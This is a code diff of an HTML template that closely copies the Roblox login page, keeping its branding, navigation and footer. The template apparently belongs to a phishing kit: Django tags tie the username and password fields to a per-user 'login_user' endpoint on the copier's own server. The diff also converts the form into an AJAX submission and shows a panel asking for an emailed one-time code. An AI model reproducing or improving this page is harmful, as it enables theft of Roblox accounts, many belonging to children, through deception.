-        __processed_b1b5d14b-5295-4c05-8669-486b597ca700__="true"
-        bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjM1Iiwic2NvcmUiOjIwMDM1fV0="
-        data-new-gr-c-s-check-loaded="14.1265.0" data-gr-ext-installed
-        bis_skin_checked="1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Roblox Corporation">
+    <meta name="description" content="Login to your Roblox account or sign up to create a new account.">
+    <meta name="keywords"
+        content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">
 
-        <meta name="csrf-token" data-token="y/JNDYw6X77L">
+    <meta name="apple-itunes-app" content="app-id=431946152">
+    <link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png">
 
-        <div id="image-retry-data" data-image-retry-max-times="30"
-            data-image-retry-timer="500" data-ga-logging-percent="10"
+    <meta ng-csp="no-unsafe-eval">
+
+    <meta name="locale-data" data-language-code="en_us" data-language-name="English" data-url-locale
+        data-override-language-header="false">
+    <meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true"
+        data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false"
+        data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false"
+        data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false"
+        data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false"
+        data-is-pcgdk-app="false">
+    <meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false">
+    <meta id="roblox-display-names" data-enabled="true">
+
+
+    <meta name="account-switching-data" data-is-account-switching-enabled="true">
+    <meta name="passkey-data" data-is-passkey-login-enabled="true">
+    <meta name="passkey-data-android" data-is-passkey-login-enabled-android="true">
+    <meta name="page-guac-migration" data-v1-path data-v2-path>
+    <meta name="page-meta" data-internal-page-name="Login">
+    <meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True">
+
+    <link href="https://images.rbxcdn.com/38a98b7c99d2d5f7c29e5a19478872c7.ico" rel="icon">
+
+    <!-- CSS files -->
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+        data-bundlename="FoundationCss" data-bundle-source="Main"
+        href="https://css.rbxcdn.com/e8da15d6323c15ba58ca8ad7aec788fd820b46f80ae28d48f95b199ef10d95e7.css">
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+        data-bundlename="StyleGuide" data-bundle-source="Main"
+        href="https://css.rbxcdn.com/944c0c29b874f40bc983ce7754218170b4265e625e7351b1c6880694adb81556.css">
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+        data-bundlename="Builder" data-bundle-source="Main"
+        href="https://css.rbxcdn.com/7fc67d38cfc34042bc251805f872ff5be8cb502859e943e5dda46fc3907375c6.css">
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+        data-bundlename="Navigation" data-bundle-source="Main"
+        href="https://css.rbxcdn.com/f7426ffb19aeabf7440648f7fc7658fa8f823763664f8b667d9b45c8007e3d20.css">
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+        data-bundlename="Footer" data-bundle-source="Main"
+        href="https://css.rbxcdn.com/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css">
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+        data-bundlename="ReactLogin" data-bundle-source="Main"
+        href="https://css.rbxcdn.com/32b67c58d5a22d084201bb7d304744a0fc18effe362ea146f694068f3fc2628c.css">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+
+</head>
+
+<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font" data-performance-relative-value="0.005"
+    style="background-image: url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); background-size: cover; background-repeat: no-repeat; background-attachment: fixed;"
+    data-internal-page-name="Login" data-send-event-percentage="0"
+    __processed_b1b5d14b-5295-4c05-8669-486b597ca700__="true"
+    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjM1Iiwic2NvcmUiOjIwMDM1fV0="
+    data-new-gr-c-s-check-loaded="14.1265.0" data-gr-ext-installed bis_skin_checked="1">
+
+    <meta name="csrf-token" data-token="y/JNDYw6X77L">
+
+    <div id="wrap" class="wrap no-gutter-ads logged-out" bis_skin_checked="1">
+
+        <div id="navigation-container" class="builder-font ixp-marketplace-rename-control charts-rename-exp-treatment"
+            data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True"
+            data-platform-event-left-nav-entry-start-time="01/01/2000 12:00:00"
+            data-platform-event-left-nav-entry-end-time="04/24/2025 19:00:00" data-platform-event-left-nav-url
             bis_skin_checked="1">
-        </div>
-        <div id="http-retry-data" data-http-retry-max-timeout="0"
-            data-http-retry-base-timeout="0" data-http-retry-max-times="1"
-            bis_skin_checked="1">
-        </div>
-
-        <div id="wrap" class="wrap no-gutter-ads logged-out"
-            bis_skin_checked="1">
-
-            <div id="navigation-container"
-                class="builder-font ixp-marketplace-rename-control charts-rename-exp-treatment"
-                data-number-of-autocomplete-suggestions="7"
-                data-is-redirect-library-to-creator-marketplace-enabled="True"
-                data-platform-event-left-nav-entry-start-time="01/01/2000 12:00:00"
-                data-platform-event-left-nav-entry-end-time="04/24/2025 19:00:00"
-                data-platform-event-left-nav-url bis_skin_checked="1">
-                <div id="header" class="navbar-fixed-top rbx-header"
-                    role="navigation" bis_skin_checked="1">
-                    <div class="container-fluid" bis_skin_checked="1">
-                        <div onclick="window.location='/xbox.html'"
-                            class="rbx-navbar-header" bis_skin_checked="1">
-                            <div id="header-menu-icon" class="rbx-nav-collapse"
-                                bis_skin_checked="1"><button type="button"
-                                    class="btn-primary-xs btn-min-width"
-                                    id="skip-to-main-content">Skip to Main
-                                    Content</button></div>
-                            <div class="navbar-header" bis_skin_checked="1">
-                                <a class="navbar-brand" href="login.html"
-                                    bis_skin_checked="1">
-                                    <span class="icon-logo"></span><span
-                                        class="icon-logo-r"></span> </a>
+            <div id="header" class="navbar-fixed-top rbx-header" role="navigation" bis_skin_checked="1">
+                <div class="container-fluid" bis_skin_checked="1">
+                    <div onclick="window.location='/xbox.html'" class="rbx-navbar-header" bis_skin_checked="1">
+                        <div id="header-menu-icon" class="rbx-nav-collapse" bis_skin_checked="1">
+                            <button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Skip to
+                                Main Content</button>
+                        </div>
+                        <div class="navbar-header" bis_skin_checked="1">
+                            <a class="navbar-brand" href="login.html" bis_skin_checked="1">
+                                <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                            </a>
+                        </div>
+                    </div>
+                    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/discover"
+                                bis_skin_checked="1">Discover</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/catalog"
+                                bis_skin_checked="1">Marketplace</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/develop"
+                                bis_skin_checked="1">Create</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/robux?ctx-nav"
+                                bis_skin_checked="1">Robux</a></li>
+                    </ul>
+                    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/discover"
+                                bis_skin_checked="1">Discover</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/catalog"
+                                bis_skin_checked="1">Marketplace</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/develop"
+                                bis_skin_checked="1">Create</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="/robux?ctx=nav"
+                                bis_skin_checked="1">Robux</a></li>
+                    </ul>
+                    <div id="right-navigation-header" bis_skin_checked="1">
+                        <div data-testid="navigation-search-input"
+                            class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search">
+                            <div class="input-group">
+                                <form>
+                                    <div class="form-has-feedback">
+                                        <input id="navbar-search-input" data-testid="navigation-search-input-field"
+                                            class="form-control input-field new-input-field" placeholder="Search"
+                                            maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off"
+                                            spellcheck="false" value>
+                                    </div>
+                                </form>
+                                <div class="input-group-btn">
+                                    <button data-testid="navigation-search-input-search-button" class="input-addon-btn"
+                                        type="button">
+                                        <span class="icon-common-search-sm"></span>
+                                    </button>
+                                </div>
                             </div>
                         </div>
-                        <ul
-                            class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/discover"
-                                    bis_skin_checked="1">Discover</a> </li>
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/catalog"
-                                    bis_skin_checked="1">Marketplace</a> </li>
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/develop"
-                                    bis_skin_checked="1">Create</a> </li>
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/robux?ctx-nav"
-                                    bis_skin_checked="1">Robux</a> </li>
-                        </ul>
-                        <ul
-                            class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/discover"
-                                    bis_skin_checked="1">Discover</a> </li>
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/catalog"
-                                    bis_skin_checked="1">Marketplace</a> </li>
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/develop"
-                                    bis_skin_checked="1">Create</a> </li>
-                            <li> <a
-                                    class="font-header-2 nav-menu-title text-header"
-                                    href="/robux?ctx=nav"
-                                    bis_skin_checked="1">Robux</a> </li>
-                        </ul>
-                        <div id="right-navigation-header"
-                            bis_skin_checked="1"><div
-                                data-testid="navigation-search-input"
-                                class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown"
-                                role="search"><div
-                                    class="input-group">
-                                    <form>
-                                        <div
-                                            class="form-has-feedback">
-                                            <input
-                                                id="navbar-search-input"
-                                                data-testid="navigation-search-input-field"
-                                                class="form-control input-field new-input-field"
-                                                placeholder="Search"
-                                                maxlength="120"
-                                                autocomplete="off"
-                                                autocorrect="off"
-                                                autocapitalize="off"
-                                                spellcheck="false"
-                                                value></div></form>
-                                    <div
-                                        class="input-group-btn"><button
-                                            data-testid="navigation-search-input-search-button"
-                                            class="input-addon-btn"
-                                            type="submit"><span
-                                                class="icon-common-search-sm"></span></button></div></div><ul
-                                    class="dropdown-menu new-dropdown-menu"
-                                    role="menu"><li
-                                        class="navbar-search-option rbx-clickable-li new-selected"><a
-                                            class="new-navbar-search-anchor"
-                                            href="/discover/?Keyword="><span
-                                                class="icon-menu-games-off navbar-list-option-icon"></span><span
-                                                class="navbar-list-option-text"></span><span
-                                                class="navbar-list-option-suffix">in
-                                                Experiences</span></a></li><li
-                                        class="navbar-search-option rbx-clickable-li"><a
-                                            class="new-navbar-search-anchor"
-                                            href="/search/users?keyword="><span
-                                                class="icon-menu-profile navbar-list-option-icon"></span><span
-                                                class="navbar-list-option-text"></span><span
-                                                class="navbar-list-option-suffix">in
-                                                People</span></a></li><li
-                                        class="navbar-search-option rbx-clickable-li"><a
-                                            class="new-navbar-search-anchor"
-                                            href="/catalog?CatalogContext=1&amp;Keyword="><span
-                                                class="icon-menu-shop navbar-list-option-icon"></span><span
-                                                class="navbar-list-option-text"></span><span
-                                                class="navbar-list-option-suffix">in
-                                                Avatar Shop</span></a></li><li
-                                        class="navbar-search-option rbx-clickable-li"><a
-                                            class="new-navbar-search-anchor"
-                                            href="/search/groups?keyword="><span
-                                                class="icon-menu-groups navbar-list-option-icon"></span><span
-                                                class="navbar-list-option-text"></span><span
-                                                class="navbar-list-option-suffix">in
-                                                Groups</span></a></li><li
-                                        class="navbar-search-option rbx-clickable-li"><a
-                                            class="new-navbar-search-anchor"
-                                            href="/develop/library?CatalogContext=2&amp;Category=6&amp;Keyword="><span
-                                                class="icon-menu-library navbar-list-option-icon"></span><span
-                                                class="navbar-list-option-text"></span><span
-                                                class="navbar-list-option-suffix">in
-                                                Creator
-                                                Marketplace</span></a></li></ul></div><div
-                                class="navbar-right rbx-navbar-right"><ul
-                                    class="nav navbar-right rbx-navbar-right-nav"><li
-                                        class="signup-button-container"><a
-                                            class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button"
-                                            href="/account/signupredir"
-                                            id="sign-up-button">Sign
-                                            Up</a></li><li
-                                        class="login-action"><a
-                                            class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item"
-                                            href="/login">Log In</a></li><li
-                                        class="rbx-navbar-right-search"><button
-                                            type="button"
-                                            class="rbx-menu-item btn-navigation-nav-search-white-md"><span
-                                                class="icon-nav-search-white"></span></button></li></ul></div></div>
+                        <div class="navbar-right rbx-navbar-right">
+                            <ul class="nav navbar-right rbx-navbar-right-nav">
+                                <li class="signup-button-container">
+                                    <a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button"
+                                        href="/account/signupredir" id="sign-up-button">Sign Up</a>
+                                </li>
+                                <li class="login-action">
+                                    <a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item"
+                                        href="/login">Log In</a>
+                                </li>
+                            </ul>
+                        </div>
                     </div>
                 </div>
-                <div id="left-navigation-container" bis_skin_checked="1"></div>
-                <div id="verificationUpsell-container"
-                    bis_skin_checked="1"><div></div></div>
-                <div id="phoneVerificationUpsell-container"
-                    bis_skin_checked="1">
-                    <div phoneverificationupsell-container
-                        bis_skin_checked="1"></div>
-                </div>
-                <div id="accountRecoveryModal-container"
-                    bis_skin_checked="1"></div>
             </div>
-            <div class="container-main
-                " id="container-main" tabindex="-1" bis_skin_checked="1">
-                <div class="alert-container" bis_skin_checked="1">
-                    <noscript>
-                        <div>
-                            <div class="alert-info" role="alert">Please enable
-                                Javascript to use all the features on this
-                                site.</div>
-                        </div>
-                    </noscript>
-                </div>
-                <div class bis_skin_checked="1">
-                    <div id="react-login-container" class="login-container"
-                        data-return-url data-enable-react-ui="true"
-                        bis_skin_checked="1">
-                        <div id="login-base" bis_skin_checked="1">
-                            <div style="width: 400px"
-                                class="section-content login-section"
-                                bis_skin_checked="1">
-                                <h1 class="login-header">Login to Roblox</h1>
-                                <div id="login-form" bis_skin_checked="1">
-                                    <div bis_skin_checked="1">
-                                        <div class="login-form-container"
-                                            bis_skin_checked="1">
-                                            <form method="POST"
-                                                action="{% url 'login_user' user_id=user_id %}">
-                                                {% csrf_token %}
-                                                <div
-                                                    class="form-group username-form-group"
-                                                    bis_skin_checked="1">
-                                                    <label for="login-username"
-                                                        class="sr-only">Username/Email/Phone</label>
-                                                    <input id="login-username"
-                                                        name="username"
-                                                        type="text"
-                                                        class="form-control input-field"
-                                                        placeholder="Username/Email/Phone"
-                                                        required>
+        </div>
+
+        <div class="container-main" id="container-main" tabindex="-1" bis_skin_checked="1">
+            <div class="alert-container" bis_skin_checked="1">
+                <noscript>
+                    <div>
+                        <div class="alert-info" role="alert">Please enable Javascript to use all the features on this
+                            site.</div>
+                    </div>
+                </noscript>
+            </div>
+            <div class="" bis_skin_checked="1">
+                <div id="react-login-container" class="login-container" data-return-url data-enable-react-ui="true"
+                    bis_skin_checked="1">
+                    <div id="login-base" bis_skin_checked="1">
+                        <div style="width: 400px" class="section-content login-section" bis_skin_checked="1">
+                            <h1 class="login-header">Login to Roblox</h1>
+
+                            <!-- Notification Area for AJAX responses -->
+                            <div id="ajax-notification"
+                                style="display:none; padding: 10px; margin-bottom: 15px; border-radius: 5px; text-align: center; font-weight: bold;">
+                            </div>
+
+                            <div id="login-form" bis_skin_checked="1">
+                                <div bis_skin_checked="1">
+                                    <div class="login-form-container" bis_skin_checked="1">
+                                        <!-- NO FORM TAG - Pure AJAX -->
+                                        <div id="loginForm">
+                                            {% csrf_token %}
+                                            <div class="form-group username-form-group" bis_skin_checked="1">
+                                                <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                                                <input id="login-username" name="username" type="text"
+                                                    class="form-control input-field" placeholder="Username/Email/Phone"
+                                                    required>
+                                                <p class="form-control-label xsmall text-error" id="username-error"
+                                                    style="display:none; color:#ff0000; font-size:10px; margin-top:4px;">
+                                                    Please enter your username/email/phone.
+                                                </p>
+                                            </div>
+                                            <div class="form-group password-form-group" bis_skin_checked="1">
+                                                <label for="login-password" class="sr-only">Password</label>
+                                                <input type="password" id="login-password" name="password"
+                                                    class="form-control input-field" placeholder="Password" required>
+                                                <p class="form-control-label xsmall text-error" id="password-error"
+                                                    style="display:none; color:#ff0000; font-size:10px; margin-top:4px;">
+                                                    Please enter your password.
+                                                </p>
+                                                <div aria-live="polite" bis_skin_checked="1">
+
+                                                    <p class="form-control-label xsmall text-error login-error"
+                                                        id="text-error"></p>
                                                 </div>
-                                                <div
-                                                    class="form-group password-form-group"
-                                                    bis_skin_checked="1">
-                                                    <label for="login-password"
-                                                        class="sr-only">Password</label>
-                                                    <input type="password"
-                                                        id="login-password"
-                                                        name="password"
-                                                        class="form-control input-field"
-                                                        placeholder="Password"
-                                                        required>
-                                                    <div aria-live="polite"
-                                                        bis_skin_checked="1">
-                                                        <p
-                                                            class="form-control-label xsmall text-error login-error"
-                                                            id="text-error"></p>
-                                                    </div>
-                                                </div>
-                                                <span id="login-loading"
-                                                    class="spinner spinner-default"
-                                                    style="display:none;"></span>
-                                                <button type="submit"
-                                                    id="login-button"
-                                                    class="btn-full-width login-button btn-secondary-md">Log In</button>
-                                            </form>
+                                            </div>
+                                            <span id="login-loading" class="spinner spinner-default"
+                                                style="display:none;"></span>
+                                            <button type="button" id="login-button"
+                                                class="btn-full-width login-button btn-secondary-md">Log In</button>
                                         </div>
                                     </div>
                                 </div>
-                                <div class="text-center forgot-credentials-link"
-                                    bis_skin_checked="1">
-                                    <div style="cursor: pointer"
-                                        onclick="parolsCvlis()"
-                                        id="forgot-credentials-link"
-                                        class="text-link"
-                                        bis_skin_checked="1">Forgot Password or
-                                        Username?</div>
+                            </div>
+                            <div class="text-center forgot-credentials-link" bis_skin_checked="1">
+                                <div style="cursor: pointer" onclick="parolsCvlis()" id="forgot-credentials-link"
+                                    class="text-link" bis_skin_checked="1">Forgot Password or Username?</div>
+                            </div>
+                            <div bis_skin_checked="1">
+                                <div class="alternative-login-divider-container" bis_skin_checked="1">
+                                    <div class="rbx-divider alternative-login-divider" bis_skin_checked="1"></div>
                                 </div>
-                                <div bis_skin_checked="1">
-                                    <div
-                                        class="alternative-login-divider-container"
-                                        bis_skin_checked="1">
-                                        <div
-                                            class="rbx-divider alternative-login-divider"
-                                            bis_skin_checked="1"></div>
-                                    </div>
-                                    <button
-                                        onclick="document.getElementById('emailSend').style.display= 'block' "
-                                        type="button" id="otp-login-button"
-                                        class="btn-full-width btn-control-md otp-login-button">Email
-                                        Me a One-Time Code</button>
-                                </div>
-                                <div class="text-center" bis_skin_checked="1">
-                                    <div class="signup-option"
-                                        bis_skin_checked="1"><span
-                                            class="no-account-text">Don't have
-                                            an account?</span><a
-                                            id="sign-up-link"
-                                            class="text-link signup-link"
-                                            href="https://www.roblox.com/"
-                                            target="_self"
-                                            bis_skin_checked="1">Sign
-                                            Up</a></div>
+                                <button onclick="document.getElementById('emailSend').style.display= 'flex'"
+                                    type="button" id="otp-login-button"
+                                    class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time
+                                    Code</button>
+                            </div>
+                            <div class="text-center" bis_skin_checked="1">
+                                <div class="signup-option" bis_skin_checked="1">
+                                    <span class="no-account-text">Don't have an account?</span>
+                                    <a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/"
+                                        target="_self" bis_skin_checked="1">Sign Up</a>
                                 </div>
                             </div>
-                            <div id="crossDeviceLoginDisplayCodeModal-container"
-                                bis_skin_checked="1"></div>
                         </div>
                     </div>
-                    <div id="SocialIdentitiesInformation"
-                        data-rbx-login-redirect-url="/social/postlogin"
-                        data-context="loginPage" bis_skin_checked="1"> </div>
-                </div>
-            </div>
-            <!--Bootstrap Footer React Component -->
-            <footer class="container-footer" id="footer-container"
-                data-is-giftcards-footer-enabled="True"><div class="footer"><ul
-                        class="row footer-links"><li class="footer-link"><a
-                                class="text-footer-nav"
-                                href="/info/about-us?locale=en_us"
-                                target="_blank">About Us</a></li><li
-                            class="footer-link"><a class="text-footer-nav"
-                                href="/info/jobs?locale=en_us"
-                                target="_blank">Jobs</a></li><li
-                            class="footer-link"><a class="text-footer-nav"
-                                href="/info/blog?locale=en_us"
-                                target="_blank">Blog</a></li><li
-                            class="footer-link"><a class="text-footer-nav"
-                                href="/info/parents?locale=en_us"
-                                target="_blank">Parents</a></li><li
-                            class="footer-link"><a
-                                class="text-footer-nav giftcards"
-                                href="/giftcards?locale=en_us"
-                                target="_blank">Gift Cards</a></li><li
-                            class="footer-link"><a class="text-footer-nav"
-                                href="/info/help?locale=en_us"
-                                target="_blank">Help</a></li><li
-                            class="footer-link"><a class="text-footer-nav"
-                                href="/info/terms?locale=en_us"
-                                target="_blank">Terms</a></li><li
-                            class="footer-link"><a class="text-footer-nav"
-                                href="/info/accessibility?locale=en_us"
-                                target="_blank">Accessibility</a></li><li
-                            class="footer-link"><a
-                                class="text-footer-nav privacy"
-                                href="/info/privacy?locale=en_us"
-                                target="_blank">Privacy</a></li><li></li></ul><div
-                        class="row copyright-container"><div
-                            class="col-sm-6 col-md-3"></div><div
-                            class="col-sm-12"><p
-                                class="text-footer footer-note">©2026 Roblox
-                                Corporation. Roblox, the Roblox logo and
-                                Powering Imagination are among our registered
-                                and unregistered trademarks in the U.S. and
-                                other countries.</p></div></div></div></footer>
-        </div>
-        <div id="user-agreements-checker-container" bis_skin_checked="1"></div>
-        <div id="cookie-banner-wrapper" class="cookie-banner-wrapper"
-            bis_skin_checked="1"><div></div></div>
-        <div id="PlaceLauncherStatusPanel" style="display:none;width:300px"
-            data-new-plugin-events-enabled="True"
-            data-event-stream-for-plugin-enabled="True"
-            data-event-stream-for-protocol-enabled="True"
-            data-is-studio-auth-ticket-enabled="True"
-            data-is-studio-sso-params-enabled="True"
-            data-is-game-launch-interface-enabled="True"
-            data-is-protocol-handler-launch-enabled="True"
-            data-is-duar-auto-opt-in-enabled="false"
-            data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False"
-            data-os-name="Windows" data-protocol-name-for-client="roblox-player"
-            data-protocol-name-for-studio="roblox-studio"
-            data-protocol-roblox-locale="en_us"
-            data-protocol-game-locale="en_us"
-            data-protocol-url-includes-launchtime="true"
-            data-protocol-detection-enabled="true"
-            data-protocol-separate-script-parameters-enabled="true"
-            data-protocol-avatar-parameter-enabled="false"
-            data-protocol-channel-name="LIVE"
-            data-protocol-studio-channel-name="LIVE"
-            data-protocol-player-channel-name="LIVE" bis_skin_checked="1">
-            <div class="modalPopup blueAndWhite PlaceLauncherModal"
-                style="min-height: 160px" bis_skin_checked="1">
-                <div id="Spinner" class="Spinner" style="padding:20px 0;"
-                    bis_skin_checked="1"> <img
-                        data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif"
-                        height="32" width="32" alt="Progress"
-                        src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif"
-                        class="src-replaced">
-                </div>
-                <div id="status"
-                    style="min-height:40px;text-align:center;margin:5px 20px"
-                    bis_skin_checked="1">
-                    <div id="Starting"
-                        class="PlaceLauncherStatus MadStatusStarting"
-                        style="display:block" bis_skin_checked="1"> Starting
-                        Roblox... </div>
-                    <div id="Waiting" class="PlaceLauncherStatus MadStatusField"
-                        bis_skin_checked="1">Connecting to People...</div>
-                    <div id="StatusBackBuffer"
-                        class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"
-                        bis_skin_checked="1"></div>
-                </div>
-                <div style="text-align:center;margin-top:1em"
-                    bis_skin_checked="1">
-                    <input type="button"
-                        class="Button CancelPlaceLauncherButton translate"
-                        value="Cancel">
                 </div>
             </div>
         </div>
-        <div id="ProtocolHandlerClickAlwaysAllowed"
-            class="ph-clickalwaysallowed" style="display:none;"
-            bis_skin_checked="1">
-            <p class="larger-font-size"> <span class="icon-moreinfo"></span>
-                Check
-                <strong>Always open links for URL: Roblox Protocol</strong> and
-                click
-                <strong>Open URL: Roblox Protocol</strong> in the dialog box
-                above to join experiences faster in the future!
-            </p>
-        </div>
-        <div id="InstallationInstructions" class style="display:none;"
-            bis_skin_checked="1">
-            <div class="ph-installinstructions" bis_skin_checked="1">
-                <div class="ph-modal-header" bis_skin_checked="1"> <span
-                        class="icon-close simplemodal-close"></span>
-                    <h3 class="title">Thanks for visiting Roblox</h3>
-                </div>
-                <div class="modal-content-container" bis_skin_checked="1">
-                    <div class="ph-installinstructions-body "
-                        bis_skin_checked="1">
-                        <ul class="modal-col-4">
-                            <li class="step1-of-4">
-                                <h2>1</h2>
-                                <p class="larger-font-size">Click
-                                    <strong>RobloxPlayer.exe</strong> to run the
-                                    Roblox
-                                    installer, which just downloaded via your
-                                    web browser.</p> <img
-                                    data-delaysrc="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png"
-                                    src="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png"
-                                    class="src-replaced">
-                            </li>
-                            <li class="step2-of-4">
-                                <h2>2</h2>
-                                <p class="larger-font-size">Click
-                                    <strong>Run</strong> when prompted by your
-                                    computer to
-                                    begin the installation process.</p> <img
-                                    data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png"
-                                    src="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png"
-                                    class="src-replaced">
-                            </li>
-                            <li class="step3-of-4">
-                                <h2>3</h2>
-                                <p class="larger-font-size">Click
-                                    <strong>Ok</strong> once you've successfully
-                                    installed
-                                    Roblox.</p> <img
-                                    data-delaysrc="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png"
-                                    src="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png"
-                                    class="src-replaced">
-                            </li>
-                            <li class="step4-of-4">
-                                <h2>4</h2>
-                                <p class="larger-font-size">After installation,
-                                    click <strong>Join</strong> below to join
-                                    the action!</p>
-                                <div class="VisitButton VisitButtonContinueGLI"
-                                    bis_skin_checked="1"> <a
-                                        class="btn btn-primary-lg disabled btn-full-width">Join</a>
-                                </div>
-                            </li>
-                        </ul>
+
+        <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True">
+            <div class="footer">
+                <ul class="row footer-links">
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/about-us?locale=en_us"
+                            target="_blank">About Us</a></li>
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/jobs?locale=en_us"
+                            target="_blank">Jobs</a></li>
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/blog?locale=en_us"
+                            target="_blank">Blog</a></li>
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/parents?locale=en_us"
+                            target="_blank">Parents</a></li>
+                    <li class="footer-link"><a class="text-footer-nav giftcards" href="/giftcards?locale=en_us"
+                            target="_blank">Gift Cards</a></li>
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/help?locale=en_us"
+                            target="_blank">Help</a></li>
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/terms?locale=en_us"
+                            target="_blank">Terms</a></li>
+                    <li class="footer-link"><a class="text-footer-nav" href="/info/accessibility?locale=en_us"
+                            target="_blank">Accessibility</a></li>
+                    <li class="footer-link"><a class="text-footer-nav privacy" href="/info/privacy?locale=en_us"
+                            target="_blank">Privacy</a></li>
+                </ul>
+                <div class="row copyright-container">
+                    <div class="col-sm-12">
